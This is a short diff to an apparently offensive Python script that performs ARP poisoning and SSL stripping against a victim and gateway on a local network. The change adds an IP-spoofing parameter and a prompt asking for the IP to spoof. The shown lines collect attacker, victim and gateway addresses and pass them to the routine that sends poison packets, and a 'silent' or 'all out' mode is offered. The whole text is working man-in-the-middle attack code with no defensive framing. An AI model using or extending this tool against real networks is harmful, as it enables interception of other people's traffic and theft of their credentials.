@@ -46,7 +46,7 @@ def sslStrip(pkt):
             send(strip_pkt, verbose=0)
 
 
-def attack(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, macGateway, opMode=None):
+def attack(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, macGateway, opMode=None, ipSpoofed=None):
     try:
         if type_attack == 0:
             print("Initialised ARP Poisoning...")
@@ -79,6 +79,7 @@ if type_attack == 0:
   opMode = int(raw_input("Enter Operational Mode (0: silent, 1: all out): "))
 else:
     opMode = None
+    ipSpoofed = raw_input("Enter the IP to spoof: ")
 
 # Find IP and MAC addresses
 ipAttacker, macAttacker = getOwnMacIP(iface)
@@ -86,4 +87,4 @@ macGateway = getMacAddress(ipGateway, iface)
 macVictim = getMacAddress(ipVictim, iface)
 
 # Send poison packets
-attack(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, macGateway, opMode)
+attack(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, macGateway, opMode, ipSpoofed)
